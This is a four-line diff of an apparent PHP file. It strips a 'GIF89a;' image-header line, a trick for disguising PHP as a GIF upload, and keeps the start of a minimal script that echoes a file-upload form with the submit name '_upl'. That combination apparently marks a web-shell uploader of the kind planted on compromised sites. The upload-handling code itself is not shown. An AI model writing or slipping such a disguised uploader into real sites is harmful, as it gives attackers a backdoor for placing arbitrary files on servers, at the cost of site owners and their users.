@@ -1,4 +1,3 @@
-GIF89a;
 <?php
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
